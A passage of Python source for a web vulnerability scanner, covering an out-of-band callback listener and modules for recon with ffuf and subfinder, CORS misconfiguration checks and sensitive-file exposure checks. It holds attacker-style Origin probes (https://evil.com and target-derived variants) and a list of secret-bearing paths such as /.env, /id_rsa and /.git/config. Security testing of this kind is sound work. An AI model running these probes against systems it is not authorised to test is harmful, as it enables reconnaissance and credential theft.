        jar[name.strip()] = value.strip()
    return jar


# Header names whose *values* must never reach the run log.
SENSITIVE_HEADER_RE = re.compile(r"(?i)(auth|cookie|token|key|session|secret|signature|csrf)")


def redact_argv(argv: List[str]) -> List[str]:
    """
    Mask credential-bearing arguments before they are logged.

    `loot/nightfalllx.log` is a file people attach to reports and commit to repos. A
    debug line reading `ffuf ... -b sid=abc123` would leak the session the scan
    was authorised with, so tools are logged through this filter instead of raw.
    """
    out: List[str] = []
    pending: Optional[str] = None  # "value" | "header"
    for item in argv:
        if pending == "value":
            out.append("<redacted>")
            pending = None
            continue
        if pending == "header":
            if ":" in item:
                name = item.split(":", 1)[0]
                out.append(f"{name}: <redacted>" if SENSITIVE_HEADER_RE.search(name) else item)
            else:
                out.append("<redacted>")
            pending = None
            continue
        out.append(item)
        if item in ("-b", "--cookie", "--headers"):
            pending = "value"
        elif item in ("-H", "--header"):
            pending = "header"
    return out


def body_digest(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8", "replace")).hexdigest()


def similarity(a: str, b: str) -> float:
    """
    Position-independent body similarity.

    The old version compared character-by-character at the same offset, so a
    single inserted byte shifted everything and two identical-looking pages
    scored low. SequenceMatcher fixes that. Bodies are capped at 60 KB because
    the boolean/time SQLi probes only need "did the page change materially",
    and difflib on a 200 KB body is slow enough to matter when it runs hundreds
    of times. quick_ratio first gives a cheap upper bound; if even that cannot
    reach the caller's threshold there is no point running the full matcher.
    """
    if a == b:
        return 1.0
    if not a or not b:
        return 0.0
    limit = 60000
    a, b = a[:limit], b[:limit]
    matcher = difflib.SequenceMatcher(None, a, b, autojunk=False)
    if matcher.real_quick_ratio() < 0.5 and matcher.quick_ratio() < 0.5:
        return matcher.quick_ratio()
    return matcher.ratio()


def rand_token(n: int = 8) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


# ===========================================================================
# 8. MODULES
# ===========================================================================
# ---------------------------------------------------------------------------
# 7.5 OUT-OF-BAND CALLBACK LISTENER
# ---------------------------------------------------------------------------
class CallbackServer:
    """
    A minimal HTTP listener on your own machine.

    Blind XXE, blind SSRF and RFI cannot be confirmed from the response -- by
    definition the response says nothing. The only honest confirmation is that
    the *target* connected back to a host you control. This gives every module
    that needs it a shared listener, so you do not have to keep a netcat window
    open and eyeball it.

    Nothing is executed here: the handler records the request and answers 200.
    """

    def __init__(self, console: "Console", host: str, port: int = 8888):
        self.console = console
        self.host = host
        self.port = port
        self.hits: List[Dict[str, Any]] = []
        self._server = None
        # Handler runs in a thread per connection; serialize the hit log.
        self._lock = threading.Lock()

    def base_url(self, path: str = "") -> str:
        return f"http://{self.host}:{self.port}/{path.lstrip('/')}"

    def start(self) -> bool:
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

        outer = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args: Any) -> None:  # silence stderr chatter
                return

            def _record(self) -> None:
                # Read the body so the socket closes cleanly on POSTs.
                length = int(self.headers.get("Content-Length") or 0)
                if length:
                    try:
                        self.rfile.read(length)
                    except OSError:
                        pass
                with outer._lock:
                    outer.hits.append(
                        {
                            "time": datetime.now(timezone.utc).isoformat(),
                            "method": self.command,
                            "path": self.path,
                            "client": self.client_address[0],
                            "user_agent": self.headers.get("User-Agent", ""),
                        }
                    )
                outer.console.good(
                    f"OOB callback hit: {self.command} {self.path} from {self.client_address[0]}"
                )

            def _reply(self) -> None:
                body = b"ok"
                try:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                except OSError:
                    pass

            def do_GET(self) -> None:
                self._record()
                self._reply()

            def do_POST(self) -> None:
                self._record()
                self._reply()

        try:
            self._server = ThreadingHTTPServer(("0.0.0.0", self.port), Handler)
        except OSError as exc:
            self.console.warn(f"callback listener could not bind port {self.port}: {exc}")
            return False
        threading.Thread(target=self._server.serve_forever, daemon=True).start()
        self.console.info(
            f"callback listener active on 0.0.0.0:{self.port} -- target must reach {self.base_url()}"
        )
        return True

    def hits_for(self, marker: str) -> List[Dict[str, Any]]:
        with self._lock:
            return [h for h in self.hits if marker in h["path"]]

    def all_hits(self) -> List[Dict[str, Any]]:
        with self._lock:
            return list(self.hits)

    def stop(self) -> None:
        if self._server:
            self._server.shutdown()
            self._server.server_close()
            self._server = None


@dataclass
class Target:
    """Everything a module needs, assembled once by the orchestrator."""

    url: str
    params: List[str]                      # parameter names to probe
    console: Console
    http: HttpClient
    tools: ToolOrchestrator
    args: argparse.Namespace
    tech: TechFingerprint
    store: FindingStore
    loot: Path
    baseline: Optional[Resp] = None
    forms: List[Dict[str, Any]] = field(default_factory=list)
    callback: Optional[CallbackServer] = None
    method: str = "GET"
    form: Dict[str, str] = field(default_factory=dict)
    json_body: Dict[str, Any] = field(default_factory=dict)
    param_location: str = "auto"

    # --- parameter value/location handling ------------------------------
    def query_values(self) -> Dict[str, str]:
        return dict(parse_qsl(urlparse(self.url).query, keep_blank_values=True))

    def all_values(self) -> Dict[str, str]:
        """Every value we know how to inject into, from any location."""
        values = self.query_values()
        values.update({k: str(v) for k, v in self.form.items()})
        for k, v in self.json_body.items():
            if isinstance(v, (str, int, float, bool)):
                values[k] = str(v)
        return values

    def original_value(self, param: str, default: str = "1") -> str:
        values = self.query_values()
        if param in values:
            return values[param]
        if param in self.form:
            return str(self.form[param])
        if param in self.json_body:
            return str(self.json_body[param])
        return default

    def location_for(self, param: str) -> str:
        if self.param_location != "auto":
            return self.param_location
        if param in self.form and param not in self.query_values():
            return "form"
        if param in self.json_body:
            return "json"
        if param in self.query_values():
            return "query"
        if self.form:
            return "form"
        if self.json_body:
            return "json"
        return "query"

    def inject(self, param: str, value: str) -> Tuple[Resp, str]:
        """
        Send `value` through the location the parameter actually lives in.

        Returns (response, request-description). For query parameters the
        description is the URL itself, so existing report text stays clean; for
        form/JSON parameters it is a one-line request line that names the body.
        """
        location = self.location_for(param)
        if location == "form":
            body = dict(self.form)
            body[param] = value
            method = self.method if self.method in ("POST", "PUT", "PATCH") else "POST"
            desc = f"{method} {self.url} [form {param}={value}]"
            return self.http.request(method, self.url, data=body), desc
        if location == "json":
            body = copy.deepcopy(self.json_body)
            body[param] = value
            method = self.method if self.method in ("POST", "PUT", "PATCH") else "POST"
            desc = f"{method} {self.url} [json {param}={value}]"
            return self.http.request(method, self.url, json=body), desc
        url = set_query_param(self.url, param, value)
        return self.http.request(self.method, url), url


def oob_base(t: Target) -> Tuple[str, bool]:
    """
    Resolve the out-of-band base URL and whether we can auto-confirm it.

    Built-in listener -> we can poll its hit log, so a callback is proof.
    --oob URL         -> external listener; we cannot read it, so a hit is a
                         manual confirmation and the finding stays a lead.
    """
    if t.callback:
        return t.callback.base_url(), True
    if t.args.oob:
        return t.args.oob.rstrip("/"), False
    return "", False


def poll_callback(t: Target, marker: str, timeout: float = 6.0) -> List[Dict[str, Any]]:
    """Poll the built-in listener instead of sleeping for a fixed second."""
    if not t.callback:
        return []
    deadline = time.time() + timeout
    while time.time() < deadline:
        hits = t.callback.hits_for(marker)
        if hits:
            return hits
        time.sleep(0.2)
    return []


class Module:
    """Base class. `run` must never raise; the orchestrator also guards it."""

    name = "base"
    description = ""

    def __init__(self, t: Target):
        self.t = t
        self.console = t.console

    def run(self) -> List[Finding]:  # pragma: no cover - interface
        raise NotImplementedError


# ---------------------------------------------------------------------------
# 8.1 RECON
# ---------------------------------------------------------------------------
class ReconModule(Module):
    """
    Directory/parameter discovery with ffuf, subdomain enumeration, and a pass
    over the obvious low-hanging metadata (robots.txt, security headers).

    The important detail is the baseline: we fetch a random path first and use
    its byte length as the ffuf `-fs` filter. Without it, an app that returns
    "Not Found" with a 200 status makes every one of the 4,600 words in
    common.txt look like a hit.
    """

    name = "recon"
    description = "Directory/parameter fuzzing (ffuf), subdomains (subfinder), metadata"

    INTERESTING = [
        "/robots.txt", "/sitemap.xml", "/.git/HEAD", "/.env", "/server-status",
        "/phpinfo.php", "/admin", "/login", "/api", "/graphql", "/backup.zip",
    ]

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        base = self.t.url

        # --- 1. baseline for soft-404 detection -------------------------
        probe = urljoin(base.rstrip("/") + "/", f"vapf-nonexistent-{rand_token()}")
        baseline = self.t.http.get(probe)
        soft_404_size = baseline.length if baseline.ok else None
        if soft_404_size is not None:
            self.console.info(f"soft-404 baseline: {baseline.status} / {soft_404_size}B at {probe}")

        # --- 2. metadata files ------------------------------------------
        for path in self.INTERESTING:
            url = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
            r = self.t.http.get(url)
            if not r.ok or r.length == 0:
                continue
            # Skip anything that is byte-identical to the soft-404 page.
            if soft_404_size is not None and r.digest == baseline.digest:
                continue
            if path == "/.git/HEAD" and "ref:" in r.text:
                findings.append(
                    Finding(
                        module=self.name,
                        title="Exposed .git directory",
                        severity="HIGH",
                        endpoint=url,
                        payload="GET /.git/HEAD",
                        evidence=r.snippet("ref:"),
                        detail="A readable .git/HEAD means the whole repository history may be "
                               "reconstructable, including secrets committed and later removed.",
                        remediation="Serve the web root from a directory that excludes .git, or "
                                    r"deny /\.git/ at the reverse proxy.",
                        references=["https://owasp.org/www-project-web-security-testing-guide/"],
                        request=request_label(url),
                    )
                )
                self.console.good(f"exposed .git at {url}")
            elif path == "/.env" and "=" in r.text:
                findings.append(
                    Finding(
                        module=self.name,
                        title="Exposed .env file",
                        severity="CRITICAL",
                        endpoint=url,
                        payload="GET /.env",
                        evidence=r.text[:200],
                        detail="Environment files typically contain database credentials and "
                               "application secrets. Treat every key in this file as compromised.",
                        remediation="Remove the file from the document root and rotate all secrets "
                                    "it contained.",
                        request=request_label(url),
                    )
                )
                self.console.crit(f"exposed .env at {url}")
            elif path == "/robots.txt" and ("disallow" in r.text.lower()):
                findings.append(
                    Finding(
                        module=self.name,
                        title="robots.txt discloses paths",
                        severity="INFO",
                        endpoint=url,
                        evidence=r.snippet("Disallow"),
                        detail="robots.txt is an enumeration aid, not an access control. Paths "
                               "listed here are worth fuzzing directly.",
                        remediation="Do not rely on robots.txt for secrecy; the listed paths must "
                                    "be protected by authentication.",
                        request=request_label(url),
                    )
                )

        # --- 3. ffuf directory discovery ---------------------------------
        wordlist = resolve_wordlist_path(self.t.args.wordlist)
        if not wordlist.is_file() and sys.stdin.isatty():
            try:
                answer = input(
                    f"[?] ffuf wordlist not found ({wordlist}). Enter a path, or press Enter to skip: "
                ).strip()
            except EOFError:
                answer = ""
            if answer:
                wordlist = Path(answer).expanduser()
        if not wordlist.is_file():
            self.console.warn(f"wordlist not found: {wordlist} (skipping ffuf)")
        elif self.t.tools.available("ffuf"):
            results = self.t.tools.ffuf(
                base,
                wordlist,
                self.t.loot / "ffuf_dirs.json",
                mode="dir",
                filter_size=soft_404_size,
                headers={"User-Agent": USER_AGENT},
            )
            interesting = [r for r in results if r.get("status") in (200, 301, 302, 401, 403)]
            if interesting:
                listing = "; ".join(
                    f"{r.get('input', {}).get('FUZZ', '?')} -> {r.get('status')} ({r.get('length')}B)"
                    for r in interesting[:25]
                )
                findings.append(
                    Finding(
                        module=self.name,
                        title=f"{len(interesting)} web path(s) discovered",
                        severity="INFO",
                        endpoint=base,
                        payload="ffuf -w <wordlist> -u <target>/FUZZ",
                        evidence=listing,
                        detail="Discovered paths are attack surface. Any endpoint returning 200 "
                               "or 401 here deserves manual review.",
                        remediation="Review each discovered path: remove debug/admin endpoints from "
                                    "production and require authentication on anything sensitive.",
                        request=f"ffuf {base}/FUZZ with {wordlist.name}",
                    )
                )
                self.console.info(f"discovered paths: {listing[:300]}")

            # Parameter-name discovery: FUZZ in the query string, filtered by the
            # baseline of the *base* URL so only params that change the page appear.
            param_results = self.t.tools.ffuf(
                base,
                wordlist,
                self.t.loot / "ffuf_params.json",
                mode="param",
                filter_size=self.t.baseline.length if self.t.baseline else None,
                headers={"User-Agent": USER_AGENT},
            )
            new_params = []
            for r in param_results:
                name = r.get("input", {}).get("FUZZ")
                if name and name not in self.t.params and r.get("status") == 200:
                    new_params.append(name)
            if new_params:
                self.t.params.extend(new_params[:50])
                findings.append(
                    Finding(
                        module=self.name,
                        title=f"{len(new_params)} hidden query parameter(s) accepted",
                        severity="LOW",
                        endpoint=base,
                        payload=",".join(new_params[:20]),
                        evidence="Parameters that change the response but are not linked in the UI "
                                 "are usually debug, admin or legacy switches.",
                        remediation="Remove undocumented parameters, or validate them against an "
                                    "allow-list of expected names.",
                        request=f"ffuf {base}?FUZZ=1",
                    )
                )
                self.console.info(f"new parameters: {', '.join(new_params[:20])}")

        # --- 4. subdomains ------------------------------------------------
        host = urlparse(base).hostname or ""
        if self.t.args.subdomains and self.t.tools.available("subfinder"):
            if re.match(r"^\d+\.\d+\.\d+\.\d+$", host):
                self.console.info("target is a literal IP; subdomain enumeration skipped")
            else:
                domain = ".".join(host.split(".")[-2:]) if host.count(".") >= 1 else host
                hosts = self.t.tools.subfinder(domain)
                live = []
                guard = ScopeGuard(self.console, self.t.args.allow_public)
                for candidate in hosts[:40]:
                    # A subdomain can resolve outside the authorised range even
                    # when the seed host does not. Apply the same scope rule
                    # before the first packet goes out.
                    if not guard.allows(f"http://{candidate}"):
                        self.console.debug(f"recon: subdomain {candidate} is out of scope; skipped")
                        continue
                    r = self.t.http.get(f"http://{candidate}", timeout=5)
                    if r.ok or r.error is None:
                        live.append(candidate)
                if hosts:
                    findings.append(
                        Finding(
                            module=self.name,
                            title=f"{len(hosts)} subdomain(s) enumerated for {domain}",
                            severity="INFO",
                            endpoint=domain,
                            payload=f"subfinder -d {domain}",
                            evidence=", ".join(hosts[:30]) + (" ..." if len(hosts) > 30 else ""),
                            detail=f"{len(live)} of the first {min(len(hosts), 40)} resolved over HTTP. "
                                   "Each host is additional attack surface and may run a different "
                                   "version of the application.",
                            remediation="Keep an inventory of live hosts; retire the ones you do not "
                                        "need, because forgotten subdomains rarely get patched.",
                            request=f"subfinder -d {domain}",
                        )
                    )

        # --- 5. missing security headers -------------------------------
        resp = self.t.baseline
        if resp and resp.ok:
            missing = [
                h for h in ("Content-Security-Policy", "X-Frame-Options",
                            "X-Content-Type-Options", "Strict-Transport-Security")
                if h.lower() not in {k.lower() for k in resp.headers}
            ]
            if missing:
                findings.append(
                    Finding(
                        module=self.name,
                        title="Missing hardening response headers",
                        severity="LOW",
                        endpoint=base,
                        payload="",
                        evidence=f"absent: {', '.join(missing)}",
                        detail="These headers are cheap defence-in-depth: CSP blunts XSS impact, "
                               "X-Frame-Options stops clickjacking, HSTS prevents downgrade.",
                        remediation="Add the absent headers at the reverse proxy so every response "
                                    "inherits them.",
                        request=f"GET {base}",
                    )
                )
        return findings


# ---------------------------------------------------------------------------
# 8.2 CORS
# ---------------------------------------------------------------------------
class CORSModule(Module):
    """
    CORS misconfiguration detection.

    The question is not "does the app send CORS headers" -- it is "does it trust
    an origin it does not own". We send a hostile Origin and compare what comes
    back. Four outcomes matter:

      * reflected origin + Access-Control-Allow-Credentials: true -> HIGH. Any
        site can read authenticated responses with the victim's cookies.
      * wildcard + credentials -> MEDIUM. Invalid per spec (browsers reject it),
        but it shows the intent and is one refactor away from exploitable.
      * reflected origin without credentials -> MEDIUM. Any site can read
        non-credentialed responses; impact depends on what the endpoint returns.
      * wildcard without credentials -> LOW. Often intentional for public APIs,
        so it is recorded as configuration, not a break-in.

    Both GET and preflight OPTIONS are checked: some frameworks only emit CORS
    headers on the preflight response.
    """

    name = "cors"
    description = "Origin reflection, null/wildcard and credentials checks (GET + OPTIONS)"

    def _origins(self) -> List[Tuple[str, str]]:
        host = urlparse(self.t.url).hostname or "target"
        candidates = [
            ("https://evil.com", "external origin"),
            ("null", "null origin (sandboxed iframe / data: URL)"),
            ("https://evilevil.com", "concatenation bypass"),
        ]
        if not re.match(r"^\d+\.\d+\.\d+\.\d+$", host):
            candidates += [
                (f"https://{host}.evil.com", "target host used as a prefix"),
                (f"https://evil.{host}", "target host used as a suffix"),
            ]
        seen = set()
        out: List[Tuple[str, str]] = []
        for origin, label in candidates:
            if origin not in seen:
                seen.add(origin)
                out.append((origin, label))
        return out

    def _send(self, origin: str, method: str) -> Resp:
        headers = {
            "Origin": origin,
            "Access-Control-Request-Method": "GET",
            "Access-Control-Request-Headers": "authorization",
            "Connection": "close",
        }
        return self.t.http.request(method, self.t.url, headers=headers)

    def run(self) -> List[Finding]:
        findings: List[Finding] = []
        observations: List[Dict[str, Any]] = []
        baseline = self.t.baseline

        for method in ("GET", "OPTIONS"):
            for origin, label in self._origins():
                resp = self._send(origin, method)
                if resp.error:
                    self.console.debug(f"cors: {method} {origin} failed: {resp.error}")
                    continue
                acao = header_get(resp, "Access-Control-Allow-Origin")
                acac = header_get(resp, "Access-Control-Allow-Credentials")
                vary = header_get(resp, "Vary")
                if not acao:
                    continue
                observations.append(
                    {
                        "method": method,
                        "origin": origin,
                        "label": label,
                        "status": resp.status,
                        "acao": acao,
                        "acac": acac,
                        "vary": vary,
                    }
                )

        if not observations:
            self.console.info("cors: no Access-Control-Allow-Origin header observed")
            return findings

        def is_cred(o: Dict[str, Any]) -> bool:
            return (o["acac"] or "").strip().lower() == "true"

        def is_reflected(o: Dict[str, Any]) -> bool:
            return o["acao"].strip().lower() == o["origin"].strip().lower()

        def is_wildcard(o: Dict[str, Any]) -> bool:
            return o["acao"].strip() == "*"

        reflected_cred = [o for o in observations if is_reflected(o) and is_cred(o)]
        wildcard_cred = [o for o in observations if is_wildcard(o) and is_cred(o)]
        reflected_only = [o for o in observations if is_reflected(o) and not is_cred(o)]
        wildcard_only = [o for o in observations if is_wildcard(o) and not is_cred(o)]

        def evidence_for(items: List[Dict[str, Any]]) -> str:
            lines = []
            for o in items[:8]:
                vary = o["vary"] or "Vary not set"
                lines.append(
                    f"{o['method']} Origin: {o['origin']} -> ACAO: {o['acao']}, "
                    f"ACAC: {o['acac'] or '-'} ({vary}); {o['label']}"
                )
            return "\n".join(lines)

        if reflected_cred:
            chosen = reflected_cred[0]
            self.console.crit("cors: credentials accepted with a reflected Origin")
            findings.append(
                Finding(
                    module=self.name,
                    title="CORS misconfiguration: credentials with reflected origin",
                    severity="HIGH",
                    endpoint=self.t.url,
                    parameter="Origin",
                    payload=chosen["origin"],
                    evidence=evidence_for(reflected_cred),
                    detail=(
                        "The server echoes an attacker-controlled Origin and allows credentials. "
                        "A malicious page can therefore call this endpoint with the victim's "
                        "cookies (fetch(..., {credentials: 'include'})) and read the response, "
                        "including account data and CSRF tokens."
                    ),
                    remediation=(
                        "Validate Origin against an explicit allow-list of trusted origins and "
                        "return the canonical origin (never the request value). Do not combine "
                        "Access-Control-Allow-Credentials: true with a wildcard. Add Vary: Origin "
                        "so caches do not serve one origin's response to another."
                    ),
                    references=[
                        "https://portswigger.net/web-security/cors",
                        "https://owasp.org/www-project-web-security-testing-guide/",
                    ],
                    next_steps=[
                        "Repeat the probe against an endpoint that returns account data, not the "
                        "public landing page; impact depends on what the response contains.",
                        "Test whether the reflected origin is also cached (missing Vary: Origin), "
                        "which can poison the cache for other users.",
                        "Check whether null and target-suffix variants are accepted, not just "
                        "the literal evil.com origin.",
                    ],
                    request=f"{chosen['method']} {self.t.url} (Origin: {chosen['origin']})",
                )
            )
        elif wildcard_cred:
            chosen = wildcard_cred[0]
            self.console.warn("cors: wildcard origin combined with credentials")
            findings.append(
                Finding(
                    module=self.name,
                    title="CORS wildcard combined with credentials",
                    severity="MEDIUM",
                    endpoint=self.t.url,
                    parameter="Origin",
                    payload=chosen["origin"],
                    evidence=evidence_for(wildcard_cred),
                    detail=(
                        "Access-Control-Allow-Origin: * cannot legally be combined with "
                        "credentials; browsers reject it. The combination indicates an intent to "
                        "allow cross-origin authenticated reads and is frequently 'fixed' by "
                        "reflecting the Origin instead, which creates a HIGH-severity bug."
                    ),
                    remediation="Return a fixed, allow-listed origin when credentials are required; "
                                "never reflect arbitrary input and never use * with credentials.",
                    references=["https://portswigger.net/web-security/cors"],
                    next_steps=[
                        "Check whether the value is actually dynamic (reflects Origin) under a "
                        "different path or method.",
                    ],
                    request=f"{chosen['method']} {self.t.url} (Origin: {chosen['origin']})",
                )
            )
        elif reflected_only:
            chosen = reflected_only[0]
            self.console.warn("cors: arbitrary Origin reflected without credentials")
            findings.append(
                Finding(
                    module=self.name,
                    title="CORS reflects arbitrary Origin (without credentials)",
                    severity="MEDIUM",
                    endpoint=self.t.url,
                    parameter="Origin",
                    payload=chosen["origin"],
                    evidence=evidence_for(reflected_only),
                    detail=(
                        "Any website can read this endpoint cross-origin; the browser will not "
                        "attach the victim's cookies because credentials are not allowed. The "
                        "impact is still real for endpoints that rely on network position, IP "
                        "allow-listing or a token that is not cookie-bound."
                    ),
                    remediation="Allow-list trusted origins and return a fixed value; add "
                                "Vary: Origin. Add credentials only if the endpoint truly needs "
                                "cookie-authenticated cross-origin reads.",
                    references=["https://portswigger.net/web-security/cors"],
                    next_steps=[
                        "Check whether any endpoint that reflects Origin also returns sensitive "
                        "data without cookies (internal status, user lists, tokens).",
                    ],
                    request=f"{chosen['method']} {self.t.url} (Origin: {chosen['origin']})",
                )
            )
        elif wildcard_only:
            self.console.info("cors: wildcard origin without credentials (public API?)")
            findings.append(
                Finding(
                    module=self.name,
                    title="CORS allows any origin",
                    severity="LOW",
                    endpoint=self.t.url,
                    parameter="Origin",
                    payload="*",
                    evidence=evidence_for(wildcard_only),
                    detail="The endpoint is intentionally or accidentally readable from any "
                           "origin. Without credentials this is often correct for a public API, "
                           "but it must not be relied on as a security boundary.",
                    remediation="Confirm the endpoint contains no tenant-specific or internal "
                                "data; otherwise restrict the allow-list.",
                    request=f"{wildcard_only[0]['method']} {self.t.url}",
                )
            )
        else:
            self.console.info("cors: CORS headers present but no permissive origin observed")

        if baseline and reflected_cred and not any(
            "vary" in (o["vary"] or "").lower() for o in reflected_cred
        ):
            self.console.debug("cors: reflected origin responses do not set Vary: Origin")
        return findings


# ---------------------------------------------------------------------------
# 8.3 INFORMATION EXPOSURE
# ---------------------------------------------------------------------------
class ExposureModule(Module):
    """
    Sensitive-file, API-documentation and directory-listing discovery.

    Every candidate is compared against a random-path baseline first. A soft-404
    app that answers 200 to everything is the norm in modern SPAs, and without
    that comparison this module would report every path as exposed.

    Detection is signature-based, not status-based: a 200 for /.env is only a
    finding if the body actually looks like environment variables, and a 200 for
    /id_rsa only counts if it contains a private-key header. Secret *values* are
    never copied into the report -- only key names and file metadata.
    """

    name = "exposure"
    description = "Sensitive files, backups, API docs, actuator and directory listings"

    FILES = [
        "/.env",
        "/backup.zip",
        "/config.php.bak",
        "/swagger-ui.html",
        "/.git/config",
        "/.git/HEAD",
        "/docker-compose.yml",
        "/id_rsa",
        "/server-status",
        "/swagger.json",
        "/openapi.json",
        "/actuator/env",
        "/web.config",
        "/phpinfo.php",
        "/.DS_Store",
    ]
    DIRECTORIES = ["/", "/uploads/", "/backup/", "/files/", "/static/",
                   "/images/", "/admin/", "/api/"]

    def _url(self, path: str, base: Optional[str] = None) -> str:
        root = base or (self.t.url.rstrip("/") + "/")
        return urljoin(root, path.lstrip("/"))

    def _bases(self) -> List[str]:
        """Check both the origin root and the target's directory.

        A path-based target such as /app/login.php usually has no sibling .env,
        while the same deployment often leaks /.env at the origin root.
        """
        parts = urlparse(self.t.url)
        root = f"{parts.scheme}://{parts.netloc}/"
        directory = parts.path.rsplit("/", 1)[0] + "/" if "/" in parts.path else "/"
        directory = f"{parts.scheme}://{parts.netloc}{directory}"
        return list(dict.fromkeys([root, directory]))

    def _probe(self, url: str) -> Resp:
        # Do not download a potentially huge archive just to see its type.
        if url.lower().endswith((".zip", ".tar", ".gz", ".sql")):
            head = self.t.http.request("HEAD", url)
            if not head.error and head.ok:
                return head
        return self.t.http.get(url)

    def _finding(self, path: str, url: str, title: str, severity: str,
                 evidence: str, detail: str, remediation: str,
                 next_steps: Optional[List[str]] = None,
                 references: Optional[List[str]] = None) -> Finding:
        return Finding(
            module=self.name,
            title=title,
            severity=severity,
            endpoint=url,
            payload=f"GET {path}",
            evidence=evidence,
            detail=detail,
            remediation=remediation,
            next_steps=next_steps or [],
            references=references or [],
            request=f"GET {url}",
        )

    def _classify(self, path: str, resp: Resp, url: Optional[str] = None) -> Optional[Finding]:
        endpoint = url or self._url(path)
        body = resp.text or ""
        lowered = body[:4000].lower()
        ctype = header_get(resp, "Content-Type").lower()
        disposition = header_get(resp, "Content-Disposition").lower()
        looks_html = "<html" in lowered or "<!doctype html" in lowered

        if path == "/.env":
            keys = env_keys(body)
            if keys and not looks_html:
                return self._finding(
                    path, endpoint, "Exposed .env file", "CRITICAL",
                    f"{len(body)} bytes; {len(keys)} variable name(s): {', '.join(keys[:15])}",
                    "Environment files normally hold database credentials, API keys and "
                    "signing secrets. Treat every value in this file as compromised.",
                    "Remove the file from the document root, rotate every secret it contained, "
                    "and add a deny rule for dotfiles at the reverse proxy.",
                    ["Search the exposed keys for database, cloud and mail credentials.",
                     "Rotate secrets first, then remove the file; deleting alone does not undo exposure."],
                )

        if path == "/id_rsa":
            if "BEGIN" in body and "PRIVATE KEY" in body:
                first = next((ln for ln in body.splitlines() if "PRIVATE KEY" in ln), "")
                return self._finding(
                    path, endpoint, "Exposed SSH private key", "CRITICAL",
                    f"private-key header present: {first.strip()[:80]}",
                    "A downloadable private key allows authentication to every host that "
                    "trusts the corresponding public key.",
                    "Remove the key from the web root, rotate the key pair, and audit "
                    "authorized_keys on any host that trusted it.",
                    ["Identify the key fingerprint and search the estate for its public half."],
                )

        if path == "/backup.zip":
            if resp.status == 200 and (
                "zip" in ctype or ".zip" in disposition or "zip" in disposition
            ) and header_get(resp, "Content-Length", "1") not in ("", "0"):
                return self._finding(
                    path, endpoint, "Downloadable site backup archive", "HIGH",
                    f"status {resp.status}; Content-Type: {ctype or 'unknown'}; "
                    f"Content-Disposition: {disposition or 'none'}",
                    "A web-served archive usually contains source code, configuration, database "
                    "dumps and secrets. Downloading it is often the fastest path to full compromise.",
                    "Remove backups from the web root and store them outside the document root "
                    "with access control.",
                    ["Confirm the archive type and size without extracting it into a shared system.",
                     "Search the archive for configuration files and credentials."],
                )

        if path == "/config.php.bak":
            if "<?php" in body or re.search(r"(?im)^\s*(DB_|DATABASE_|APP_KEY|password)\w*\s*[=:]", body):
                return self._finding(
                    path, endpoint, "Exposed configuration backup", "HIGH",
                    f"{len(body)} bytes of configuration source (values redacted)",
                    "Editor and deployment backups of configuration files are served as plain "
                    "text, so source code and credentials bypass PHP execution.",
                    "Delete backup files, block *.bak/*.old/*.swp at the proxy, and rotate any "
                    "credentials present.",
                    ["Search the file for database and API credentials, then rotate them."],
                )

        if path == "/.git/config":
            if "[core]" in lowered or "repositoryformatversion" in lowered:
                return self._finding(
                    path, endpoint, "Exposed .git directory", "HIGH",
                    "Git configuration is readable; repository metadata is exposed",
                    "With .git readable, the full source history can be reconstructed, including "
                    "secrets that were committed and later removed.",
                    "Serve from a web root without .git, or deny /\\.git/ at the reverse proxy.",
                    ["Check /.git/HEAD and attempt a repository reconstruction with git-dumper.",
                     "Treat every secret in the history as compromised."],
                )

        if path == "/.git/HEAD":
            if body.strip().startswith("ref:"):
                return self._finding(
                    path, endpoint, "Exposed .git/HEAD", "HIGH",
                    body.strip()[:120],
                    "Repository metadata is reachable, which enables reconstruction of the full "
                    "source history.",
                    "Deny access to .git at the web server and remove it from the deployed tree.",
                )

        if path == "/docker-compose.yml":
            if ("services:" in lowered or "version:" in lowered) and not looks_html:
                return self._finding(
                    path, endpoint, "Exposed docker-compose.yml", "HIGH",
                    f"{len(body)} bytes of compose configuration (values redacted)",
                    "Compose files describe internal services, ports, volumes and often include "
                    "environment secrets and database passwords.",
                    "Remove deployment files from the web root and rotate any secrets they contain.",
                    ["Map the services and ports listed; they define the internal attack surface."],
                )

        if path == "/server-status":
            if re.search(r"Apache Server Status|Server Status|server-status", body, re.I):
                return self._finding(
                    path, endpoint, "Apache server-status exposed", "MEDIUM",
                    resp.snippet("Server Status") or body[:200],
                    "server-status lists current requests, client IPs and worker state; it is "
                    "reconnaissance for load, internal hosts and active sessions.",
                    "Require authentication for /server-status and restrict it to localhost.",
                )

        if path == "/swagger-ui.html":
            if "swagger" in lowered or "swagger-ui" in lowered:
                return self._finding(
                    path, endpoint, "Swagger UI exposed", "MEDIUM",
                    "Swagger UI markup present",
                    "Interactive API documentation maps every endpoint and often allows requests "
                    "with the tester's credentials.",
                    "Disable Swagger UI in production or protect it with authentication.",
                    ["Fetch the referenced swagger.json/openapi.json and review every endpoint."],
                )

        if path in ("/swagger.json", "/openapi.json"):
            if resp.status == 200:
                try:
                    data = json.loads(body)
                except (json.JSONDecodeError, ValueError):
                    data = None
                if isinstance(data, dict) and ("swagger" in data or "openapi" in data):
                    paths = data.get("paths") or {}
                    version = data.get("info", {}).get("version", "unknown") if isinstance(data.get("info"), dict) else "unknown"
                    return self._finding(
                        path, endpoint, "OpenAPI/Swagger specification exposed", "MEDIUM",
                        f"version {version}; {len(paths)} path(s) documented; "
                        f"title: {data.get('info', {}).get('title', 'unknown') if isinstance(data.get('info'), dict) else 'unknown'}",
                        "The full API contract is public, including endpoints and parameters that "
                        "have no UI. This shortens discovery to minutes.",
                        "Remove the specification from production or require authentication; "
                        "authorise every endpoint server-side regardless.",
                        ["Parse the document and test undocumented and administrative paths."],
                    )

        if path == "/actuator/env":
            if resp.status == 200:
                try:
                    data = json.loads(body)
                except (json.JSONDecodeError, ValueError):
                    data = None
                if isinstance(data, dict) and ("propertySources" in data or "activeProfiles" in data):
                    return self._finding(
                        path, endpoint, "Spring Actuator environment exposed", "HIGH",
                        "propertySources/activeProfiles present (values redacted)",
                        "Actuator /env exposes configuration properties, including datasource "
